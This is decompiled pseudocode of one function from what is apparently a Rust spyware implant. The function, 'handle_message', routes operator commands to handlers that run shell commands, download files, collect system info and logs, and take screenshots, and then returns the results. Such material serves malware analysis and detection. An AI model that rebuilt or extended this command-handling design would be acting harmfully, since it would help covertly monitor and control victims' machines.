__int64 __fastcall spyware::communication::server::handle_message(
        __int64 a1,
        char **a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6)
{
  __int128 v6; // xmm0
  __int64 v7; // rax
  __int64 result; // rax
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // r8
  __int64 v12; // r9
  char v13; // bp
  unsigned __int64 v14; // r15
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  char **v18; // [rsp+0h] [rbp-338h] BYREF
  __int64 v19; // [rsp+8h] [rbp-330h]
  __int64 v20; // [rsp+10h] [rbp-328h]
  __int128 v21; // [rsp+18h] [rbp-320h]
  _QWORD v22[5]; // [rsp+38h] [rbp-300h] BYREF
  __int128 v23; // [rsp+60h] [rbp-2D8h] BYREF
  __int64 v24; // [rsp+70h] [rbp-2C8h]
  _OWORD v25[2]; // [rsp+80h] [rbp-2B8h] BYREF
  unsigned __int64 v26; // [rsp+A0h] [rbp-298h] BYREF
  __int128 v27; // [rsp+A8h] [rbp-290h]
  __int128 v28; // [rsp+B8h] [rbp-280h]
  __int128 v29; // [rsp+C8h] [rbp-270h]
  __int64 v30; // [rsp+D8h] [rbp-260h]
  unsigned __int64 v31; // [rsp+E0h] [rbp-258h] BYREF
  __int128 v32; // [rsp+E8h] [rbp-250h]
  __int128 v33; // [rsp+F8h] [rbp-240h]
  __int128 v34; // [rsp+108h] [rbp-230h]
  __int64 v35; // [rsp+118h] [rbp-220h]
  unsigned __int64 v36; // [rsp+120h] [rbp-218h] BYREF
  __int128 v37; // [rsp+128h] [rbp-210h]
  __int128 v38; // [rsp+138h] [rbp-200h]
  __int128 v39; // [rsp+148h] [rbp-1F0h]
  __int64 v40; // [rsp+158h] [rbp-1E0h]
  unsigned __int64 v41; // [rsp+160h] [rbp-1D8h] BYREF
  __int128 v42; // [rsp+168h] [rbp-1D0h]
  __int128 v43; // [rsp+178h] [rbp-1C0h]
  __int128 v44; // [rsp+188h] [rbp-1B0h]
  __int64 v45; // [rsp+198h] [rbp-1A0h]
  _OWORD v46[3]; // [rsp+1A0h] [rbp-198h] BYREF
  __int64 v47; // [rsp+1D0h] [rbp-168h]
  _OWORD v48[3]; // [rsp+1D8h] [rbp-160h] BYREF
  __int64 v49; // [rsp+208h] [rbp-130h]
  _OWORD v50[3]; // [rsp+210h] [rbp-128h] BYREF
  __int64 v51; // [rsp+240h] [rbp-F8h]
  _OWORD v52[3]; // [rsp+248h] [rbp-F0h] BYREF
  __int64 v53; // [rsp+278h] [rbp-C0h]
  _OWORD v54[4]; // [rsp+280h] [rbp-B8h] BYREF
  _OWORD v55[7]; // [rsp+2C8h] [rbp-70h] BYREF

  switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )
  {
    case 0uLL:
      v6 = *(_OWORD *)(a1 + 8);
      v25[1] = *(_OWORD *)(a1 + 24);
      v25[0] = v6;
      spyware::actions::commands::run_command_message(v46, v25);
      v30 = v47;
      v29 = v46[2];
      v28 = v46[1];
      v27 = v46[0];
      v26 = 0x8000000000000001LL;
      v7 = spyware::communication::server::send_response((__int64)&v26, (__int64)a2);
      a2 = &off_B8B20;
      result = core::result::Result<T,E>::unwrap(v7, &off_B8B20);
      switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )
      {
        case 0uLL:
        case 6uLL:
        case 8uLL:
          return result;
        case 2uLL:
        case 4uLL:
          goto LABEL_17;
        default:
          return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                   a1,
                   a2,
                   v9,
                   v10,
                   v11,
                   v12,
                   v18,
                   v19,
                   v20,
                   v21,
                   *((_QWORD *)&v21 + 1));
      }
      return result;
    case 2uLL:
      v24 = *(_QWORD *)(a1 + 24);
      v23 = *(_OWORD *)(a1 + 8);
      spyware::actions::basic_info::download_file_message(v48, &v23);
      v35 = v49;
      v34 = v48[2];
      v33 = v48[1];
      v32 = v48[0];
      v31 = 0x8000000000000003LL;
      v16 = spyware::communication::server::send_response((__int64)&v31, (__int64)a2);
      a2 = &off_B8B38;
      result = core::result::Result<T,E>::unwrap(v16, &off_B8B38);
      switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )
      {
        case 0uLL:
          return core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(
                   a1 + 8,
                   a2,
                   v9,
                   v10,
                   v11,
                   v12,
                   v18,
                   v19,
                   v20,
                   v21,
                   *((_QWORD *)&v21 + 1));
        case 2uLL:
        case 6uLL:
        case 8uLL:
          return result;
        case 4uLL:
          goto LABEL_17;
        default:
          return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                   a1,
                   a2,
                   v9,
                   v10,
                   v11,
                   v12,
                   v18,
                   v19,
                   v20,
                   v21,
                   *((_QWORD *)&v21 + 1));
      }
      return result;
    case 4uLL:
      spyware::actions::basic_info::get_basic_info_request(
        v55,
        a2,
        a3,
        a4,
        a5,
        a6,
        *(_QWORD *)(a1 + 8),
        *(_QWORD *)(a1 + 16),
        *(_QWORD *)(a1 + 24));
      v54[3] = v55[3];
      v54[2] = v55[2];
      v54[1] = v55[1];
      v54[0] = v55[0];
      v15 = spyware::communication::server::send_response((__int64)v54, (__int64)a2);
      a2 = &off_B8B50;
      core::result::Result<T,E>::unwrap(v15, &off_B8B50);
      result = core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(&v18);
      v13 = 0;
      v14 = *(_QWORD *)a1 ^ 0x8000000000000000LL;
      if ( v14 <= 8 )
        goto LABEL_13;
      return core::ptr::drop_in_place<spyware::communication::messages::Message>(
               a1,
               a2,
               v9,
               v10,
               v11,
               v12,
               v18,
               v19,
               v20,
               v21,
               *((_QWORD *)&v21 + 1));
    case 6uLL:
      spyware::actions::log_actions::get_logs_request(v50);
      v40 = v51;
      v39 = v50[2];
      v38 = v50[1];
      v37 = v50[0];
      v36 = 0x8000000000000007LL;
      v17 = spyware::communication::server::send_response((__int64)&v36, (__int64)a2);
      a2 = &off_B8B68;
      goto LABEL_12;
    case 8uLL:
      spyware::actions::screenshot_actions::get_screenshot_request(v52);
      v45 = v53;
      v44 = v52[2];
      v43 = v52[1];
      v42 = v52[0];
      v41 = 0x8000000000000009LL;
      v17 = spyware::communication::server::send_response((__int64)&v41, (__int64)a2);
      a2 = &off_B8B80;
LABEL_12:
      v13 = 1;
      result = core::result::Result<T,E>::unwrap(v17, a2);
      v14 = *(_QWORD *)a1 ^ 0x8000000000000000LL;
      goto LABEL_13;
    default:
      result = core::sync::atomic::atomic_load(a1, a2, a3, a4);
      if ( result )
      {
        v18 = &off_B8B10;
        v19 = 1LL;
        v20 = 8LL;
        v21 = 0LL;
        v22[0] = aSpywareCommuni;
        v22[1] = 30LL;
        v22[2] = aSpywareCommuni;
        v22[3] = 30LL;
        v22[4] = log::__private_api::loc(&off_B8B98);
        a2 = (char **)(&dword_0 + 1);
        result = log::__private_api::log(&v18, 1LL, v22);
      }
      v13 = 1;
      v14 = *(_QWORD *)a1 ^ 0x8000000000000000LL;
      if ( v14 > 8 )
        return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                 a1,
                 a2,
                 v9,
                 v10,
                 v11,
                 v12,
                 v18,
                 v19,
                 v20,
                 v21,
                 *((_QWORD *)&v21 + 1));
LABEL_13:
      switch ( v14 )
      {
        case 0uLL:
          return core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(
                   a1 + 8,
                   a2,
                   v9,
                   v10,
                   v11,
                   v12,
                   v18,
                   v19,
                   v20,
                   v21,
                   *((_QWORD *)&v21 + 1));
        case 2uLL:
          goto LABEL_17;
        case 4uLL:
          if ( v13 )
LABEL_17:
            result = core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(a1 + 8);
          break;
        case 6uLL:
        case 8uLL:
          return result;
        default:
          return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                   a1,
                   a2,
                   v9,
                   v10,
                   v11,
                   v12,
                   v18,
                   v19,
                   v20,
                   v21,
                   *((_QWORD *)&v21 + 1));
      }
      return result;
  }
}